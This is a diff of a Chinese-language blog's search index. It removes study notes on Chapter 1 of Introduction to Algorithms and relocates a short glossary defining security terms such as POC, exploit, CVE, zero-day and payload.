-    <url>/2021/06/11/%E7%AE%97%E6%B3%95%E5%AF%BC%E8%AE%BA%E2%80%94%E2%80%94%E7%AC%AC1%E7%AB%A0/</url>
-    <content><![CDATA[<h1 id="算法导论——第1章-算法在计算中的作用"><a href="#算法导论——第1章-算法在计算中的作用" class="headerlink" title="算法导论——第1章 算法在计算中的作用"></a>算法导论——第1章 算法在计算中的作用</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>什么是算法？为什么算法值得研究？相对于计算机使用的其他技术来说算法的作用是什么？</p>
-<p>本章我们将回答这些问题。</p>
-<h2 id="1-1-算法"><a href="#1-1-算法" class="headerlink" title="1.1 算法"></a>1.1 算法</h2><p><strong>算法</strong>就是<strong>任何良定义（well-defined）的计算过程</strong>，该过程取某个值或值的集合作为<strong>输入</strong>并<strong>产生</strong>某个值或值的集合作为<strong>输出</strong>。</p>
-<blockquote>
-<p>良定义（well defined）就是指<strong>无歧义的、不会导致矛盾的、符合其应满足的所有要求</strong>的定义</p>
-</blockquote>
-<p><strong>问题陈述</strong>说明了期望的输入和输出之间的<strong>关系</strong>。<strong>算法</strong>描述实现这个关系的<strong>计算过程</strong>。</p>
-<p><strong>问题实例</strong>由计算该问题所必须的（满足问题陈述中的各种约束条件的）<strong>输入</strong>组成。</p>
-<p>若对每个<strong>输入实例</strong>，算法都以<strong>正确的输出</strong>停机，则称该算法是<strong>正确的</strong>，并称该算法<strong>解决了</strong>给定的计算问题。</p>
-<p><strong>算法解决的问题：</strong></p>
-<ol>
-<li><strong>人类基因工程。</strong>识别人类DNA中的所有10万个基因，确定构成DNA的30亿个化学基对的序列，在数据库中<strong>存储这类信息</strong>并<strong>为数据分析开发工具</strong>。</li>
-<li><strong>互联网</strong>使得全世界的人都能快速地访问与检索大量信息。借助于一些聪明的算法，互联网上的网站能够<strong>管吗理和处理这些海量数据</strong>。必须使用算法的问题示例包括为<strong>数据传输寻找好的路由</strong>（求解这些问题的技术在第24章给出），<strong>使用一个搜索引擎来快速地找到特定信息所在的网页</strong>（有关技术在11章和32章中）</li>
-<li><strong>电子商务</strong>使得货物与服务能够以电子方式洽谈与交换，并且它依赖于像信用卡号、密码和银行结单这类个人信息的保密性。电子商务中使用的核心技术包括(第31章中包含的)<strong>公钥密码与数字签名，它们以数值算法和数论为基础</strong>。</li>
-<li>制造业和其他商务企业常常需要<strong>按最有益的方式来分配稀有资源</strong>。一家石油公司也许希望知道在什么地方设置其油井，以便最大化其预期的利润。一位政治候选人也许想确定在什么地方花钱购买竞选广告，以便最大化赢得竞选的机会。一家航空公司也许希望按尽可能最廉价的方式把乘务员分配到班机上，以确保每个航班被覆盖并且满足政府有关乘务员调度的法规。一个互联网服务提供商也许希望确定在什么地方放置附加的资源，以便更有效地服务其顾客。所有这些都是可以用<strong>线性规划</strong>来求解的问题的例子，我们将在第29章学习这种技术。 </li>
-</ol>
-<p><strong>更加具体的问题：</strong></p>
-<ol>
-<li>给定一张交通图，上面标记了每对相邻十字路口之间的距离，我们希望确定从一个十字路口到另一个十字路口的<strong>最短道路</strong>。<br>即使不允许穿过自身的道路，可能路线的数量也会很大。在所有可能路线中，我们如何选择哪一条是最短的？<br>这里首先把交通图(它本身就是实际道路的一个模型)<strong>建模为一个图</strong>(第六部分和附录B将涉及这个概念)，然后<strong>寻找图中</strong>从一个顶点到另一个顶点的<strong>最短路径</strong>。第24章将介绍如何有效地求解这个问题。</li>
-<li>给定两个<strong>有序的符号序列X和Y</strong>，求出X和Y的<strong>最长公共子序列</strong>。<br>X的<strong>子序列就是去掉一些元素</strong>(可能是所有，也可能一个没有)后的X。例如，(A，B，C，D，E，F，G)的一个子序列是(B，C，E，G)。X和Y的<strong>最长公共子序列的长度度量了这两个序列的相似程度</strong>。例如，若两个序列是DNA链中的基对则当它们具有长的公共子序列时我们认为它们是相似的。<br>若X有m个符号且Y有n个符号，则X和Y分别有2^m和2^n个可能的子序列。除非m和n很小，否则选择X和Y的所有可能子序列做匹配将花费使人望而却步多的时间。第15章将介绍如何使用一种称为<strong>动态规划</strong>的一般技术来有效地求解这个问题。</li>
-<li>给定一个依据部件库的机械设计，其中每个部件可能包含其他部件的实例，<strong>我们需要依次列出这些部件，以使每个部件出现在使用它的任何部件之前</strong>。若该<strong>设计由n个部件组成</strong>，则<strong>存在n!种可能的顺序</strong>，其中n!表示阶乘函数。<br>因为阶乘函数甚至比指数函数增长还快，（除非我们只有几个部件，否则）先生成每种可能的顺序，再验证按该顺序每个部件出现在使用它的部件之前，是不可行的。这个问题是<strong>拓扑排序</strong>的一个实例，第22章将介绍如何有效地求解这个问题。</li>
-<li>给定平面上的n个点，我们希望寻找这些点的凸壳。<strong>凸壳就是包含这些点的最小的凸多边形</strong>。直观上，我们可以把每个点看成由从一块木板钉出的一颗钉子来表示。凸壳则由一根拉紧的环绕所有钉子的橡皮筋来表示。如果橡皮筋因绕过某颗钉子而转弯，那么这颗钉子就是凸壳的一个顶点(例子参见图33-6)。<br>n个点的2”个子集中的任何一个都可能是凸壳的顶点集。仅知道哪些点是凸壳的顶点还很不够，因为我们还必须知道它们出现的顺序。所以为求凸壳的顶点，存在许多选择。<strong>第33章将给出两种用于求凸壳的好方法。</strong></li>
-</ol>
-<p>从上述问题中，<strong>算法问题共有的两个特征</strong>：</p>
-<ol>
-<li><strong>存在许多候选解</strong>，但绝大多数候选解都没有解决手头的问题。<strong>寻找一个真正的解或一个最好的解</strong>可能是一个很大的挑战。</li>
-<li><strong>存在实际应用。</strong>在上面所列的问题中，<strong>最短路径问题</strong>提供了最易懂的例子。一家运输公司(如公路运输或铁路运输公司)对如何在公路或铁路网中找出最短路径，有着经济方面的利益，因为采用的路径越短，其人力和燃料的开销就越低。互联网上的一个路由结点为了快速地发送一条消息可能需要寻找通过网络的最短路径。</li>
-</ol>
-<p><strong>数据结构</strong>是一种存储和组织数据的方式，旨在便于访问和修改。</p>
-<p><strong>技术。</strong>虽然可以把本书当做一本有关算法的“菜谱”来使用，但是也许在某一天你会遇到一个问题，一时无法很快找到一个已有的算法来解决它（例如本书中的许多练习和思考题就是这样的情况）。<br>本书将教你一些<strong>算法设计与分析的技术</strong>，以便你能<strong>自行设计算法、证明其正确性和理解其效率。</strong><br>不同的章介绍算法问题求解的不同方面。有些章处理特定的问题，例如，<strong>第9章</strong>的求中位数和顺序统计量，<strong>第23章</strong>的计算最小生成树，<strong>第26章</strong>的确定网络中的最大流。其他章介绍一些技术，例如<strong>第4章</strong>的分治策略，<strong>第15章</strong>的动态规划，<strong>第17章</strong>的摊还分析。</p>
-<p><strong>难题。NP完全问题</strong>中每个问题的复杂度与整个类的复杂度有关联性，假如其中任意一个问题在多项式时间内可解的，则这一类问题都是多项式时间可解。这类问题没有已知的有效算法，但我们可以找到一些<strong>“近似算法”</strong>。</p>
-<p><strong>并行性。</strong>为了从多核计算机获得最佳的性能，<strong>设计算法时必须考虑并行性</strong>。第27章给出了<strong>充分利用多核的“多线程”算法</strong>的一个模型。从理论的角度来看，该模型具有一些优点，它形成了几个成功的计算机程序的基础，包括一个国际象棋博弈程序。</p>
-<h2 id="1-2-作为一种技术的算法"><a href="#1-2-作为一种技术的算法" class="headerlink" title="1.2 作为一种技术的算法"></a>1.2 作为一种技术的算法</h2><p><strong>有效的算法</strong>可以帮助我们明智地去使<strong>用时间（计算时间）和空间（存储器空间）资源</strong>。</p>
-<p><strong>效率。</strong>为<strong>求解相同问题</strong>而设计的<strong>不同算法</strong>在<strong>效率方面</strong>常常有<strong>显著差别</strong>，这些差别可能比<strong>由于硬件和软件造成的差别</strong>要重要得多。</p>
-<p>我们应该像计算机硬件一样把<strong>算法看成一种技术</strong>，因为整个系统的性能不但依赖于快速的硬件也依赖于有效的算法。</p>
-<p><strong>相对于其他先进技术</strong>，算法也是十分重要的技术。因为所有这些都广泛地使用算法，<strong>算法</strong>是当代计算机中使用的<strong>大多数技术的核心</strong>。</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这章概述算法这种技术，让读者认识一些<strong>算法概念</strong>，知道算法的地位和<strong>重要性</strong>。</p>
-]]></content>
-      <categories>
-        <category>Algorithm</category>
-      </categories>
-      <tags>
-        <tag>算法导论</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>算法期末复习</title>
     <url>/2021/06/17/%E7%AE%97%E6%B3%95%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/</url>
     <content><![CDATA[<h1 id="算法期末复习"><a href="#算法期末复习" class="headerlink" title="算法期末复习"></a>算法期末复习</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本想整个《算法导论》来进行系统学习，后来发现高估自己了。</p>
@@ -3530,6 +3533,31 @@ php反序列化漏洞。
       </categories>
       <tags>
         <tag>考试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>计算机安全相关的概念</title>
+    <url>/2021/06/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E6%A6%82%E5%BF%B5/</url>
+    <content><![CDATA[<h1 id="计算机安全相关的概念"><a href="#计算机安全相关的概念" class="headerlink" title="计算机安全相关的概念"></a>计算机安全相关的概念</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本专业相关概念，放在这里方便自己查询</p>
+<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><em>POC，Proof of Concept</em>，中文意思是“观点证明”。</p>
+<p>这个短语会在漏洞报告中使用，漏洞报告中的<em>POC</em>则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p>
+<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><em>EXP，Exploit</em>，中文意思是“漏洞利用”。</p>
+<p>意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p>
+<h2 id="VUL"><a href="#VUL" class="headerlink" title="VUL"></a>VUL</h2><p><em>VUL，Vulnerability</em>的缩写，泛指漏洞。</p>
+<h2 id="CVE漏洞编号"><a href="#CVE漏洞编号" class="headerlink" title="CVE漏洞编号"></a>CVE漏洞编号</h2><p><em>CVE</em>的英文全称是<em>“Common Vulnerabilities &amp; Exposures”</em>，翻译为通用漏洞披露，例如CVE-2015-0057、CVE-1999-0001等等。</p>
+<p><em>CVE</em>就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</p>
+<p>如果在一个漏洞报告中指明的一个漏洞，如果有<em>CVE</em>名称，你就可以快速地在任何其它<em>CVE</em>兼容的数据库中找到相应修补的信息，解决安全问题。</p>
+<h2 id="0-DAY漏洞和0-DAY攻击"><a href="#0-DAY漏洞和0-DAY攻击" class="headerlink" title="0 DAY漏洞和0 DAY攻击"></a>0 DAY漏洞和0 DAY攻击</h2><p>在计算机领域中，<em>Zero-day exploit</em>通常是指还没有补丁的安全漏洞，而<em>Zero-day attack</em>则是指利用这种漏洞进行的攻击。</p>
+<p>提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。</p>
+<p><em>Zero-day exploit</em>的利用程序对网络安全具有巨大威胁，因此零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><em>payload</em>，可以理解为一系列信息中最为关键的信息。</p>
+<p>对于程序员来说就是在程序中起关键作用的代码。</p>
+]]></content>
+      <categories>
+        <category>security</category>
+      </categories>
+      <tags>
+        <tag>Vulnerabilities</tag>
       </tags>
   </entry>
   <entry>
@@ -3565,31 +3593,6 @@ php反序列化漏洞。
       </categories>
       <tags>
         <tag>贪心算法</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>计算机安全相关的概念</title>
-    <url>/2021/06/24/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[<h1 id="计算机安全相关的概念"><a href="#计算机安全相关的概念" class="headerlink" title="计算机安全相关的概念"></a>计算机安全相关的概念</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>本专业相关概念，放在这里方便自己查询</p>
-<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p><em>POC，Proof of Concept</em>，中文意思是“观点证明”。</p>
-<p>这个短语会在漏洞报告中使用，漏洞报告中的<em>POC</em>则是一段说明或者一个攻击的样例，使得读者能够确认这个漏洞是真实存在的。</p>
-<h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p><em>EXP，Exploit</em>，中文意思是“漏洞利用”。</p>
-<p>意思是一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码，可以使得读者完全了解漏洞的机理以及利用的方法。</p>
-<h2 id="VUL"><a href="#VUL" class="headerlink" title="VUL"></a>VUL</h2><p><em>VUL，Vulnerability</em>的缩写，泛指漏洞。</p>
-<h2 id="CVE漏洞编号"><a href="#CVE漏洞编号" class="headerlink" title="CVE漏洞编号"></a>CVE漏洞编号</h2><p><em>CVE</em>的英文全称是<em>“Common Vulnerabilities &amp; Exposures”</em>，翻译为通用漏洞披露，例如CVE-2015-0057、CVE-1999-0001等等。</p>
-<p><em>CVE</em>就好像是一个字典表，为广泛认同的信息安全漏洞或者已经暴露出来的弱点给出一个公共的名称。</p>
-<p>如果在一个漏洞报告中指明的一个漏洞，如果有<em>CVE</em>名称，你就可以快速地在任何其它<em>CVE</em>兼容的数据库中找到相应修补的信息，解决安全问题。</p>
-<h2 id="0-DAY漏洞和0-DAY攻击"><a href="#0-DAY漏洞和0-DAY攻击" class="headerlink" title="0 DAY漏洞和0 DAY攻击"></a>0 DAY漏洞和0 DAY攻击</h2><p>在计算机领域中，<em>Zero-day exploit</em>通常是指还没有补丁的安全漏洞，而<em>Zero-day attack</em>则是指利用这种漏洞进行的攻击。</p>
-<p>提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。</p>
-<p><em>Zero-day exploit</em>的利用程序对网络安全具有巨大威胁，因此零日漏洞不但是黑客的最爱，掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。</p>
-<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p><em>payload</em>，可以理解为一系列信息中最为关键的信息。</p>
-<p>对于程序员来说就是在程序中起关键作用的代码。</p>
-]]></content>
-      <categories>
-        <category>security</category>
-      </categories>
-      <tags>
-        <tag>Vulnerabilities</tag>
       </tags>
   </entry>
   <entry>
